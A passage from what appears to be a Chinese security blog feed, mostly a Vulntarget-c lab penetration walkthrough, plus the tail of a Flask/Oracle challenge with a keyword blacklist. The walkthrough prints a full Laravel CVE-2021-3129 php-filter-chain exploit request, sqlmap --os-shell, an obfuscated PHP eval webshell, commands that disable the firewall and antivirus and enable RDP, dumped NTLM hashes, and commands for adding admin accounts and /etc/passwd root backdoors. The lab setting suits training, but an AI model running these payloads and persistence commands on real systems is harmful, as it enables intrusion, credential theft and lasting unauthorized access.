ol_port, sid)</span><br><span class="line">logging.basicConfig(level=logging.INFO, filename=&#x27;/var/log/web.log&#x27;, format=&#x27;%(asctime)s %(message)s&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(sql):</span><br><span class="line">    blacklist = [&quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;update&quot;, &quot;table&quot;, &quot;user&quot;, &quot;drop&quot;, &quot;alert&quot;, &quot;procedure&quot;, &quot;exec&quot;,</span><br><span class="line">                 &quot;open&quot;, &quot;:=&quot;, &quot;declare&quot;, &quot;runtime&quot;, &quot;process&quot;, &quot;invoke&quot;, &quot;newinstance&quot;, &quot;parse&quot;,</span><br><span class="line">                 &quot;.class&quot;, &quot;loader&quot;, &quot;script&quot;, &quot;url&quot;, &quot;xml&quot;, &quot;method&quot;, &quot;field&quot;, &quot;reflect&quot;, &quot;defineclass&quot;,</span><br><span class="line">                 &quot;getclass&quot;, &quot;forname&quot;, &quot;constructor&quot;, &quot;transform&quot;, &quot;sql&quot;, &quot;beans&quot;, &quot;.net&quot;, &quot;http&quot;, &quot;.rmi&quot;, &quot;naming&quot;</span><br><span class="line">                 ]</span><br><span class="line">    sql = sql.lower()</span><br><span class="line">    for blackword in blacklist:</span><br><span class="line">        if blackword in sql:</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log(ip, sql, error=None):</span><br><span class="line">    error_text = &quot;-----------------------&#123;&#125;-----------------------\n&quot;.format(ip)</span><br><span class="line">    error_text += &quot;sql: &#123;&#125; \n&quot;.format(sql)</span><br><span class="line">    if error != None:</span><br><span class="line">        error_text += &quot;error: &#123;&#125; \n&quot;.format(error)</span><br><span class="line">    error_text += &quot;-------------------------------------------------&quot;</span><br><span class="line">    logging.error(error_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/query&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def query():</span><br><span class="line">    sql = request.form[&quot;sql&quot;]</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if check(sql):</span><br><span class="line">        return &quot;waf&quot;</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            conn = oracledb.connect(user=username, password=password, dsn=dsn)</span><br><span class="line">            conn.callTimeout = 5000</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            cursor.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            log(ip, sql)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            log(ip, sql, e)</span><br><span class="line">            return &quot;error&quot;</span><br><span class="line">        return &quot;query success&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8888)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;solo-php&quot;&gt;&lt;a href=&quot;#solo-php&quot; class=&quot;headerlink&quot; title=&quot;solo-php&quot;&gt;&lt;/a&gt;solo-php&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-c</title>
    <link href="https://ke1nys.github.io/posts/bb2e0be6.html"/>
    <id>https://ke1nys.github.io/posts/bb2e0be6.html</id>
    <published>2023-11-28T11:57:45.000Z</published>
    <updated>2023-12-06T02:51:48.631Z</updated>
    
    <content type="html"><![CDATA[<p>此环境是没有域的  纯是内网</p><p>目标ip 192.168.52.130</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/vulntarget]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.130 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.130  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.130:80 open</span><br><span class="line">192.168.52.130:22 open</span><br></pre></td></tr></table></figure><p>这里的话就开放了两个端口 </p><p>80端口是存在一个laravel的一个<code>CVE 2021-3129</code>  这个直接去网上招poc来打就行  但是这里的话我就直接用N1CTF的一道题的方法来打 就是php-filter-chain</p><p>抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.52.130</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/public/index.php&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用php-filter-chain生成自己想要的命令后然后传入就行了</p><p><img src="../images/image-20231128202809407.png" alt="image-20231128202809407"></p><p>然后上蚁剑就行了 </p><p><img src="../images/image-20231128203313060.png" alt="image-20231128203313060"></p><p>低权限 尝试提权  先上线viper  </p><p><img src="../images/image-20231128203535851.png" alt="image-20231128203535851"></p><p>直接跑提权模块  sudo suid 啥的 也可以看看  但是这个里一般先跑这个   看看内核有没有可利用的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>然后跑出了我们的老伙伴</p><p><img src="../images/image-20231129151705027.png" alt="image-20231129151705027"></p><p>然后直接跑这个exp就行了</p><p>靶机可能没打坏了  打到底还是没root权限  不过不影响</p><p>收集一下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:ce:01:48 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.52.130/24 brd 192.168.52.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1690sec preferred_lft 1690sec</span><br><span class="line">    inet6 fe80::20c:29ff:fece:148/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: ens38: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:ce:01:52 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.20.141/24 brd 10.0.20.255 scope global ens38</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fece:152/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>一共是有两个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.130</span><br><span class="line">10.0.20.141</span><br></pre></td></tr></table></figure><p>扫一下内网发现是只扫到了我们的这台机器  猜测是开启了防火墙  于是只扫端口来判断是否存在其他主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fs* -h 10.0.20.0/24 -np -p 21,22,80,81,135,137,139,445,1357,3306,8080,8081</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231129153528952.png" alt="image-20231129153528952"></p><p>扫描结果发现是存在两个ip  一个是本机的ip 一个是内网其他主机的ip 并且开放了80端口  存在web界面</p><p>挂个代理进行访问</p><p><img src="../images/image-20231129153904253.png" alt="image-20231129153904253"></p><p>后台存在弱口令  admin/admin123 进去  然后就去搜索这个框架的漏洞  发现存在sql注入</p><p><a href="https://www.exploit-db.com/exploits/50644">https://www.exploit-db.com/exploits/50644</a>  这篇文章就是</p><p><img src="../images/image-20231129154129887.png" alt="image-20231129154129887"></p><p>抓个包 然后丢到sqlmap来跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -r sql.txt --os-shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231129154459765.png" alt="image-20231129154459765"></p><p>他一共是上传了两个马子  一个马子是可以上传文件  一个马子是可以后门<strong>(可惜的是不能连蚁剑)</strong></p><p>而且呢  经过测试发现  这里的话是存在waf的  就是上传一般的webshell是会被查杀的  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如一句话这种  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>所以这里的话得上免杀马 (这里用的是作者wp里给的马  ) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo ^&lt;^?php $a = $_REQUEST[&#x27;d&#x27;];$a = &quot;$a&quot;;$b[&#x27;test&#x27;] = &quot;&quot;;eval($b[&#x27;test&#x27;].&quot;$a&quot;);?^&gt;^ &gt; test.php</span><br></pre></td></tr></table></figure><p>其实这里也有两个马子 这里就不放出来了</p><p><img src="D:\L1n_Blog\source\images\image-20231129155054365.png" alt="image-20231129155054365"></p><p>然后上蚁剑就行了</p><p><img src="D:\L1n_Blog\source\images\image-20231129155150874.png" alt="image-20231129155150874"></p><p>成功上线  由于这台机器是这个windows机器  于是尝试跑一下tasklist  看看有没有杀软</p><p><img src="D:\L1n_Blog\source\images\image-20231129155313377.png" alt="image-20231129155313377"></p><p>发现是存在windows的自带的杀软 defend  <strong>(这里本来是想使用修改注册表的方法来关掉这个杀软  但是发现不行 )</strong></p><p>于是开始上免杀了  这里的使用的是掩日的本地隔离方法来做免杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="D:\L1n_Blog\source\images\image-20231129155606600.png" alt="image-20231129155606600"></p><p>然后上传免杀过的exe文件 (先生成c文件   然后免杀生成exe文件)</p><p><img src="D:\L1n_Blog\source\images\image-20231129155804322.png" alt="image-20231129155804322"></p><p><img src="D:\L1n_Blog\source\images\image-20231129155824812.png" alt="image-20231129155824812"></p><p>使用方法   <code>Df6.exe Df6.txt</code></p><p><img src="D:\L1n_Blog\source\images\image-20231129155912721.png" alt="image-20231129155912721"></p><p><img src="D:\L1n_Blog\source\images\image-20231129155944997.png" alt="image-20231129155944997"></p><p>主机成功的上线  然后开始收集信息  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username       Domain           NTLM                              SHA1</span><br><span class="line">--------       ------           ----                              ----</span><br><span class="line">Administrator  WIN-JJJBQ4N87RA  dfc8d2bfa540a0a6e2248a82322e654e  cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">(null)            (null)           (null)</span><br><span class="line">Administrator     WIN-JJJBQ4N87RA  (null)</span><br><span class="line">WIN-JJJBQ4N87RA$  WORKGROUP        (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">(null)            (null)           (null)</span><br><span class="line">Administrator     WIN-JJJBQ4N87RA  (null)</span><br><span class="line">win-jjjbq4n87ra$  WORKGROUP        (null)</span><br></pre></td></tr></table></figure><p>这里其实拿到了这个system权限  这个管理员的密码知不知道其实无所谓了  <strong>我们都可以直接改了(或者新增管理员用户进去了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav  //上线meterpreter 获取高权限后可以关闭杀软   (记录一个命令)</span><br></pre></td></tr></table></figure><p>然后开启3389端口  rdp进去看看</p><p>(防火墙也要记得关了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改本地管理员账号</span><br><span class="line">net user administrator qwer1234!</span><br><span class="line"></span><br><span class="line">新添加本地管理员账户</span><br><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p>随便选个账户登进去就行了 </p><p>这里最好还是选择  第一个用本地管理员账户登录  因为这样的话能看到原始的桌面上的东西 用新账号的话就会出现新的桌面  空白的  还得取翻目录  比较麻烦</p><p><img src="D:\L1n_Blog\source\images\image-20231129161626872.png" alt="image-20231129161626872"></p><p>登录进去后 发现有个ssh管理工具  然后有个ip  </p><p><img src="D:\L1n_Blog\source\images\image-20231129161805657.png" alt="image-20231129161805657"></p><p>然后这样就可以拿到账号密码了  (其实账号密码就是刚开始的管理员密码  Admin#123)</p><p>这是一种拿到该机器root的方法 <strong>(挂fscan扫出来也是内网就这个一台机器)</strong></p><p>接下是挂二级代理将该ip给外带出来到viper上</p><p><img src="D:\L1n_Blog\source\images\image-20231129162129645.png" alt="image-20231129162129645"></p><p>设置好二级代理后   直接上viper设置监听</p><p><img src="D:\L1n_Blog\source\images\image-20231129162249739.png" alt="image-20231129162249739"></p><p>注意好设置  然后开启监听  生成elf文件</p><p>这里注意一点就是  先将elf文件转换成base64编码  然后再传入该机器中  这样才会避免呗defender查杀</p><p><img src="D:\L1n_Blog\source\images\image-20231129162603422.png" alt="image-20231129162603422"></p><p><img src="D:\L1n_Blog\source\images\image-20231129163003466.png" alt="image-20231129163003466"></p><p>md  不管了  反正思路就是这个思路  可能靶机被我打坏了  </p><p>然后还是和第一个靶机一样  跑suggester来提权到root就行  结束</p><p>接下来是记录一点东西</p><p>除了定时任务和写ssh当后门外  还有一个方法是往/etc/passwd中写东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">生成密码： openssl passwd -1 -salt admin 123456 </span><br><span class="line">-1 的意思是使用md5crypt加密算法 </span><br><span class="line">-salt 指定盐为admin </span><br><span class="line">123456 明文密码</span><br><span class="line"></span><br><span class="line">echo &#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;cshm:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class="line">passwd cshm #修改cshm的密码为cshm123</span><br><span class="line"></span><br><span class="line">echo &quot;wxg:x:1000:1000::/:/bin/sh&quot; &gt;&gt; /etc/passwd  #增加普通用户账号</span><br><span class="line">passwd wxg  #修改wxg的密码为wxg147258369</span><br></pre></td></tr></table></figure><p><strong>总结  有几点好处就是体会到了免杀  之前打的靶机全是那种理想环境  (缺点就是没有域环境)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;此环境是没有域的  纯是内网&lt;/p&gt;
&lt;p&gt;目标ip 192.168.52.130&lt;/p&gt;
&lt;p&gt;fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-b</title>
    <link href="https://ke1nys.github.io/posts/cc293b70.html"/>
    <id>https://ke1nys.github.io/posts/cc293b70.html</id>
    <published>2023-11-23T11:19:00.000Z</published>
    <updated>2023-12-06T02:51:48.633Z</updated>
    
    <content type="html"><![CDATA[<p>目标ip 192.168.52.128</p><p>先使用fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.128 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.128  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.128:81 open</span><br><span class="line">192.168.52.128:80 open</span><br><span class="line">192.168.52.128:888 open</span><br><span class="line">192.168.52.128:22 open</span><br><span class="line">192.168.52.128:21 open</span><br><span class="line">192.168.52.128:3306 open</span><br><span class="line">192.168.52.128:8888 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://192.168.52.128     code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://192.168.52.128:888 code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888 code:302 len:219    title:Redirecting... 跳转url: http://192.168.52.128:8888/login</span><br><span class="line">[*] WebTitle: http://192.168.52.128:81  code:200 len:14404  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888/login code:200 len:802    title:安全入口校验失败</span><br></pre></td></tr></table></figure><p>看到8888端口  猜测是宝塔搭建的  